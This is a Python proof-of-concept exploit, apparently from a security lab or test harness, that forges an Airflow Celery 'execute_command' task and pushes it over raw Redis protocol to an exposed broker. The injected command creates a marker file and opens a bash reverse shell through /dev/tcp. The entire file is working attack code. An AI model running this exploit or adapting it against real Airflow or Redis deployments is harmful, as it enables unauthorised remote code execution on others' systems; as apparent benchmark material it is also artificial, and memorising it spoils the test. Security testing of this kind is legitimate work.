#!/usr/bin/env python3
"""Publish a forged Airflow Celery task to the exposed Redis broker."""

import base64
import json
import os
import socket
import time
import urllib.parse
import uuid


REDIS_PORT = 6379
QUEUE_NAME = "default"
TARGET_FILE = "/tmp/dojo-file-creation/airflow_002_created"
TASK_NAME = "airflow.executors.celery_executor.execute_command"


def build_message(command: str, task_id: str) -> dict:
    body = [[command], {}, {
        "chain": None,
        "chord": None,
        "errbacks": None,
        "callbacks": None,
    }]
    return {
        "body": base64.b64encode(json.dumps(body).encode()).decode(),
        "content-encoding": "utf-8",
        "content-type": "application/json",
        "headers": {
            "lang": "py",
            "task": TASK_NAME,
            "id": task_id,
            "root_id": task_id,
            "parent_id": None,
            "group": None,
            "eta": None,
            "expires": None,
            "retries": 0,
            "timelimit": [None, None],
            "argsrepr": repr((command,)),
            "kwargsrepr": "{}",
            "origin": "airflow-002-poc",
        },
        "properties": {
            "correlation_id": task_id,
            "reply_to": task_id,
            "delivery_mode": 2,
            "delivery_info": {"exchange": "", "routing_key": QUEUE_NAME},
            "priority": 0,
            "body_encoding": "base64",
            "delivery_tag": task_id,
        },
    }


def encode_redis_command(parts: list[bytes]) -> bytes:
    encoded = [b"*" + str(len(parts)).encode() + b"\r\n"]
    for part in parts:
        encoded.extend((b"$" + str(len(part)).encode() + b"\r\n", part, b"\r\n"))
    return b"".join(encoded)


def publish_task(host: str, message: dict) -> None:
    body = json.dumps(message, separators=(",", ":")).encode()
    command = encode_redis_command([b"LPUSH", QUEUE_NAME.encode(), body])
    with socket.create_connection((host, REDIS_PORT), timeout=15) as connection:
        connection.sendall(command)
        response = connection.recv(1024)
    if not response.startswith(b":"):
        raise RuntimeError("Redis did not accept the forged task: {!r}".format(response))


def main() -> None:
    target_url = os.environ["REMOTE_TARGET_URL"]
    host = urllib.parse.urlparse(target_url).hostname
    if not host:
        raise ValueError("REMOTE_TARGET_URL has no hostname")
    command = (
        "touch {}; bash -c 'bash -i >& /dev/tcp/localhost/4444 0>&1'"
    ).format(TARGET_FILE)
    publish_task(host, build_message(command, str(uuid.uuid4())))
    time.sleep(20)
    print(json.dumps({"evidence_payload": {}}))


if __name__ == "__main__":
    main()
